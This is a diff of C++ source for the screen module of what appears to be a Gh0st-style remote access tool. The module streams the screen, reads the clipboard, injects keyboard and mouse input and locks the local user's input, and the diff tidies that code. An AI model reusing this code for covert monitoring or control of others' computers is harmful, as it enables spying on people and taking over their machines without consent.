@@ -28,10 +28,6 @@ CScreenManager::CScreenManager(IOCPClient* ClientObject, int n):CManager(ClientO
 
 	m_ScreenSpyObject = new CScreenSpy(16);
 
-	if (m_ScreenSpyObject==NULL)
-	{
-		return;
-	}
 	m_hWorkThread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)WorkThreadProc,this,0,NULL);
 }
 
@@ -40,14 +36,14 @@ DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
 {
 	CScreenManager *This = (CScreenManager *)lParam;
 
-	This->SendBitMapInfor();         //发送bmp位图结构
-	// 等控制端对话框打开
+	This->SendBitMapInfor(); //发送bmp位图结构
 
+	// 等控制端对话框打开
 	This->WaitForDialogOpen();   
 
 	clock_t last = clock();
 	This->SendFirstScreen();
-	const int fps = 8;// 帧率
+	const int fps = 10;// 帧率
 	const int sleep = 1000 / fps;// 间隔时间（ms）
 	while (This->m_bIsWorking)
 	{
@@ -66,7 +62,7 @@ DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
 		}
 	}
 
-	cout<<"ScreenWorkThread Exit"<<endl;
+	cout<<"ScreenWorkThread Exit\n";
 
 	return 0;
 }
@@ -74,8 +70,7 @@ DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
 VOID CScreenManager::SendBitMapInfor()
 {
 	//这里得到bmp结构的大小
-
-	ULONG   ulLength = 1 + m_ScreenSpyObject->GetBISize();   //大小
+	ULONG   ulLength = 1 + m_ScreenSpyObject->GetBISize();
 	LPBYTE	szBuffer = (LPBYTE)VirtualAlloc(NULL, 
 		ulLength, MEM_COMMIT, PAGE_READWRITE);
 
@@ -88,7 +83,7 @@ VOID CScreenManager::SendBitMapInfor()
 
 CScreenManager::~CScreenManager()
 {
-	cout<<"ScreenManager 析构函数"<<endl;
+	cout<<"ScreenManager 析构函数\n";
 
 	m_bIsWorking = FALSE;
 
@@ -115,19 +110,19 @@ VOID CScreenManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 		{
 			BlockInput(false);
 			ProcessCommand(szBuffer + 1, ulLength - 1);
-			BlockInput(m_bIsBlockInput);  //再回复成用户的设置
+			BlockInput(m_bIsBlockInput);  //再恢复成用户的设置
 
 			break;
 		}
 	case COMMAND_SCREEN_BLOCK_INPUT: //ControlThread里锁定
 		{
-			m_bIsBlockInput = *(LPBYTE)&szBuffer[1];   //鼠标键盘的锁定
+			m_bIsBlockInput = *(LPBYTE)&szBuffer[1]; //鼠标键盘的锁定
 
 			BlockInput(m_bIsBlockInput);
 
 			break;
 		}
-	case COMMAND_SCREEN_GET_CLIPBOARD:   //给你
+	case COMMAND_SCREEN_GET_CLIPBOARD:
 		{
 			SendClientClipboard();
 			break;
@@ -169,7 +164,7 @@ VOID CScreenManager::SendClientClipboard()
 		return;
 	}
 	int	  iPacketLength = GlobalSize(hGlobal) + 1;
-	char*   szClipboardVirtualAddress = (LPSTR) GlobalLock(hGlobal);    //锁定 
+	char*   szClipboardVirtualAddress = (LPSTR) GlobalLock(hGlobal); //锁定 
 	LPBYTE	szBuffer = new BYTE[iPacketLength];
 
 
@@ -186,10 +181,7 @@ VOID CScreenManager::SendFirstScreen()
 {
 	//类CScreenSpy的getFirstScreen函数中得到图像数据
 	//然后用getFirstImageSize得到数据的大小然后发送出去
-	BOOL	bRet = FALSE;
-	LPVOID	FirstScreenData = NULL;
-
-	FirstScreenData = m_ScreenSpyObject->GetFirstScreenData();  
+	LPVOID	FirstScreenData = m_ScreenSpyObject->GetFirstScreenData();  
 	if (FirstScreenData == NULL)
 	{
 		return;
@@ -197,10 +189,6 @@ VOID CScreenManager::SendFirstScreen()
 
 	ULONG	ulFirstSendLength = 1 + m_ScreenSpyObject->GetFirstScreenLength();
 	LPBYTE	szBuffer = new BYTE[ulFirstSendLength];
-	if (szBuffer == NULL)
-	{
-		return;
-	}
 
 	szBuffer[0] = TOKEN_FIRSTSCREEN;
 	memcpy(szBuffer + 1, FirstScreenData, ulFirstSendLength - 1);
@@ -214,8 +202,7 @@ VOID CScreenManager::SendFirstScreen()
 
 const char* CScreenManager::GetNextScreen(ULONG &ulNextSendLength)
 {
-	//得到数据，得到数据大小，然后发送
-	//我们到getNextScreen函数的定义 
+	AUTO_TICK(5);
 	LPVOID	NextScreenData = m_ScreenSpyObject->GetNextScreenData(&ulNextSendLength);
 
 	if (ulNextSendLength == 0 || NextScreenData == NULL)
@@ -248,9 +235,7 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
 	ULONG	ulMsgCount = ulLength / sizeof(MSG);
 
 	// 处理多个命令
-
-	//1ruan  kdjfkdf   gan
-	for (int i = 0; i < ulMsgCount; i++)   //1
+	for (int i = 0; i < ulMsgCount; ++i)
 	{
 		MSG	*Msg = (MSG *)(szBuffer + i * sizeof(MSG));
 		switch (Msg->message)
@@ -268,8 +253,13 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
 				POINT Point;
 				Point.x = LOWORD(Msg->lParam);
 				Point.y = HIWORD(Msg->lParam);
+				if(m_ScreenSpyObject->m_bZoomed)
+				{
+					Point.x *= m_ScreenSpyObject->m_wZoom;
+					Point.y *= m_ScreenSpyObject->m_hZoom;
+				}
 				SetCursorPos(Point.x, Point.y);
-				SetCapture(WindowFromPoint(Point));  //???
+				SetCapture(WindowFromPoint(Point));
 			}
 			break;
 		default:
@@ -311,7 +301,7 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
 		case WM_KEYDOWN:
 		case WM_SYSKEYDOWN:
 			keybd_event(Msg->wParam, MapVirtualKey(Msg->wParam, 0), 0, 0);
-			break;	
+			break;
 		case WM_KEYUP:
 		case WM_SYSKEYUP:
 			keybd_event(Msg->wParam, MapVirtualKey(Msg->wParam, 0), KEYEVENTF_KEYUP, 0);
@@ -319,5 +309,5 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
 		default:
 			break;
 		}
-	}	
+	}
 }
